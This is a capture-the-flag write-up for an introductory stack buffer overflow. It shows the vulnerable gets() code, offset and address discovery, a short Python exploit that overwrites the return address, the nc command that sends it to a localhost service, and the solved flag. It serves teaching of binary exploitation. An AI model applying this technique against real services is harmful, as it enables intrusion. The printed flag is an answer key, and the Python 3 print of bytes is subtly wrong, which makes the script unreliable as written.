# Stack Overflow 101

Author: [Claude](https://github.com/anthropics)

## Description

A basic buffer overflow challenge to introduce binary exploitation.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- GDB or any debugger
- Python for exploit script
- Basic understanding of stack overflows

## Sources

```
Can you overflow the buffer and call the secret function?

nc localhost 9999
```

## Exploit

This is a classic stack-based buffer overflow challenge. Looking at the source code:

```c
void secret() {
    printf("Flag: %s\n", FLAG);
}

void vulnerable() {
    char buffer[64];
    gets(buffer);  // Vulnerable!
}
```

The `gets()` function doesn't check buffer boundaries, allowing us to overflow the buffer and overwrite the return address.

Steps to exploit:

1. Find the offset to the return address:
```bash
python -c 'print("A"*72 + "B"*4)' | ./vuln
```

2. Find the address of the `secret()` function using GDB or objdump:
```bash
objdump -d vuln | grep secret
```

3. Craft the exploit:
```python
import struct

offset = 72
secret_addr = 0x08049182  # Address of secret()

payload = b"A" * offset
payload += struct.pack("<I", secret_addr)

print(payload)
```

4. Send the payload:
```bash
python exploit.py | nc localhost 9999
```

The flag is:

```
csictf{buff3r_0v3rfl0ws_4r3_d4ng3r0us}
```
